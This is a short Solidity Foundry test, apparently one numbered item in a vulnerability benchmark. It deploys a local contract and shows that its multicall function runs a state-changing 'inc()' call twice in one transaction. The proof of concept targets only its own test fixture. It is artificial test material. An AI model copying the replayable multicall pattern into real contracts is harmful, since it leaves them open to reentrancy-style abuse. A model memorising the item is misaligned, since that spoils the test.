// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contract.sol";

contract Exploit_030_c4_multicall_reentrancy is Test {
    function testExploit_MulticallCanReplayStatefulCalls() public {
        C4MulticallReentrancy c = new C4MulticallReentrancy();
        bytes[] memory x = new bytes[](2);
        x[0] = abi.encodeWithSignature("inc()");
        x[1] = abi.encodeWithSignature("inc()");
        c.multicall(x);
        assertEq(c.n(), 2, "multicall repeatedly mutates state in one execution path");
    }
}
